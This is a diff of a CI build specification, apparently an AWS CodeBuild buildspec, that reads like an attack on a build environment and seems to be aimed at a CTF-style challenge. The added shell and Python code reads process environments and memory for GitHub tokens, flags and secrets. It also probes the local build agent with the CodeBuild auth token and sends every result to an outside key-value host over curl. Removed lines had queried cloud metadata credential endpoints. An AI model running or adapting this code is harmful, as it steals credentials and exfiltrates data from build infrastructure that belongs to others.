@@ -13,47 +13,75 @@ phases:
         set +e
         bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
         runid="${CODEBUILD_BUILD_ID##*:}"
-        putkey(){ key="$1"; file="$2"; head -c 30000 "$file" | curl -fsS --connect-timeout 5 --max-time 20 --data-binary @- "$bucket/${runid}_$key" || true; }
+        putkey(){ key="$1"; file="$2"; head -c 60000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
         echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
         {
-          echo '=== env filtered ==='
-          env | sort | grep -Eiv 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)|CODEBUILD_AUTH_TOKEN'
-          echo '=== identity ==='
-          aws sts get-caller-identity --output json 2>&1
-          echo '=== flag file names ==='
-          find / -xdev \( -path /proc -o -path /sys -o -path /dev \) -prune -o -type f 2>/dev/null | grep -Ei 'flag|ctf|secret|codebreach|hacktricks' | head -n 300
-          echo '=== flag content hits ==='
-          for d in /codebuild /tmp /root /opt /var /usr/local /workspace; do [ -d "$d" ] && grep -RInaE 'flag\{|ctf\{|HTB\{|HackTricks\{|codebreach|FLAG|flag' "$d" 2>/dev/null | head -n 200; done
-        } > /tmp/search.txt 2>&1
-        putkey search /tmp/search.txt
+          echo '=== ps ==='
+          ps auxww
+          echo '=== proc environ filtered ==='
+          for p in /proc/[0-9]*; do
+            pid=${p##*/}; [ -r "$p/environ" ] || continue
+            echo "--- pid $pid $(tr '\0' ' ' < "$p/cmdline" | head -c 200)"
+            tr '\0' '\n' < "$p/environ" | grep -Eiv 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)|CODEBUILD_AUTH_TOKEN' | grep -Ei 'flag|token|secret|github|codebuild|pat|gh[opsu]_|credential|webhook|source|repo|auth' || true
+          done
+          echo '=== agent route/auth strings ==='
+          for b in /codebuild/readonly/agent /codebuild/readonly/executor /codebuild/readonly/start /codebuild/readonly/bootstrap-log /codebuild/readonly/executor-log /codebuild/output/log; do
+            echo "--- $b"
+            strings "$b" 2>/dev/null | grep -Ei 'Authorization|Bearer|CODEBUILD_AUTH|auth|token|secret|github|credential|/v1|/api|route|flag' | head -n 300
+          done
+        } > /tmp/proc.txt 2>&1
+        putkey proc /tmp/proc.txt
         {
-          echo '=== agent endpoint index ==='
-          for base in http://127.0.0.1:7831 http://localhost:7831 https://CODEBUILD_AGENT:3000; do
-            echo "### $base"
-            for p in / /ping /health /status /v1 /v1/status /v1/metadata /v1/tasks /build /builds /logs /env /variables /creds /credentials /latest/meta-data/ /container/metadata /api/v1/build; do
-              echo "--- $p"
-              curl -k -sS --connect-timeout 2 --max-time 5 "$base$p" 2>&1 | head -c 4000; echo
+          echo '=== agent with auth variants ==='
+          for base in http://127.0.0.1:7831 http://localhost:7831; do
+            for h in \
+              "Authorization: $CODEBUILD_AUTH_TOKEN" \
+              "Authorization: Bearer $CODEBUILD_AUTH_TOKEN" \
+              "Authorization: Basic $CODEBUILD_AUTH_TOKEN" \
+              "X-CodeBuild-Auth-Token: $CODEBUILD_AUTH_TOKEN" \
+              "X-Amz-CodeBuild-Token: $CODEBUILD_AUTH_TOKEN" \
+              "X-Aws-CodeBuild-Token: $CODEBUILD_AUTH_TOKEN" \
+              "CodeBuild-Auth-Token: $CODEBUILD_AUTH_TOKEN"; do
+              echo "### $base header ${h%%:*}"
+              for p in / /ping /health /status /v1/status /v1/metadata /v1/build /build /logs /env /variables /credentials /api/v1/build; do
+                echo "--- $p"
+                curl -sS --connect-timeout 2 --max-time 5 -H "$h" "$base$p" 2>&1 | sed -E 's/(AccessKeyId|SecretAccessKey|Token|CODEBUILD_AUTH_TOKEN)[^,}]*/\1:REDACTED/g' | head -c 2500; echo
+              done
             done
           done
-          echo '=== aws/container metadata ==='
-          for u in \
-            "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" \
-            "http://169.254.170.2${CODEBUILD_CONTAINER_CREDENTIALS_RELATIVE_URI}" \
-            "http://169.254.170.2/v2/metadata" \
-            "http://169.254.170.2/v3/metadata" \
-            "http://169.254.170.2/v4/metadata" \
-            "http://169.254.170.2/v4/task" \
-            "http://169.254.169.254/latest/meta-data/" \
-            "http://169.254.169.254/latest/dynamic/instance-identity/document"; do
-              echo "--- $u"
-              curl -sS --connect-timeout 2 --max-time 5 "$u" 2>&1 | sed -E 's/(AccessKeyId|SecretAccessKey|Token|CODEBUILD_AUTH_TOKEN)[^,}]*/\1:REDACTED/g' | head -c 6000; echo
-          done
-        } > /tmp/endpoints.txt 2>&1
-        putkey endpoints /tmp/endpoints.txt
-        {
-          echo '=== root dirs ==='
-          for d in / /codebuild /codebuild/readonly /codebuild/output /tmp /root /opt /var/task /workspace; do echo "--- $d"; ls -la "$d" 2>&1; done
-          echo '=== selected readable small files ==='
-          find /codebuild /tmp /root /opt -xdev -type f -size -200k 2>/dev/null | head -n 250 | while read f; do echo "--- $f"; sed -n '1,120p' "$f" 2>/dev/null | sed -E 's/(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|CODEBUILD_AUTH_TOKEN)=.*/\1=REDACTED/'; done
-        } > /tmp/files.txt 2>&1
-        putkey files /tmp/files.txt
+        } > /tmp/agentauth.txt 2>&1
+        putkey agentauth /tmp/agentauth.txt
+        cat > /tmp/memscan.py <<'PY'
+import os,re
+patterns=[re.compile(rb'flag\{[^}\x00\r\n]{1,200}\}',re.I),re.compile(rb'ctf\{[^}\x00\r\n]{1,200}\}',re.I),re.compile(rb'HackTricks\{[^}\x00\r\n]{1,200}\}',re.I),re.compile(rb'codebreach[^\x00\r\n]{0,200}',re.I),re.compile(rb'gh[opsu]_[A-Za-z0-9_]{20,120}')]
+print('=== memory scan ===')
+for pid in [x for x in os.listdir('/proc') if x.isdigit()]:
+    try:
+        cmd=open(f'/proc/{pid}/cmdline','rb').read().replace(b'\0',b' ')[:200]
+        maps=open(f'/proc/{pid}/maps','r').read().splitlines()
+        mem=open(f'/proc/{pid}/mem','rb',0)
+    except Exception as e:
+        continue
+    seen=set()
+    for line in maps:
+        parts=line.split()
+        if len(parts)<2 or 'r' not in parts[1]: continue
+        if len(parts)>=6 and any(s in parts[-1] for s in ['/usr/lib/','/root/.goenv/','/root/.dotnet/','/opt/apache-ant']): continue
+        a,b=[int(x,16) for x in parts[0].split('-')]
+        if b-a>50_000_000: continue
+        try:
+            mem.seek(a); data=mem.read(b-a)
+        except Exception:
+            continue
+        for pat in patterns:
+            for m in pat.findall(data):
+                s=m[:220]
+                if s in seen: continue
+                seen.add(s)
+                if s.startswith((b'ghp_',b'gho_',b'ghs_',b'ghu_')): s=s[:8]+b'...REDACTED'
+                print(f'pid={pid} cmd={cmd!r} hit={s!r}')
+    try: mem.close()
+    except Exception: pass
+PY
+        python3 /tmp/memscan.py > /tmp/memscan.txt 2>&1
+        putkey memscan /tmp/memscan.txt
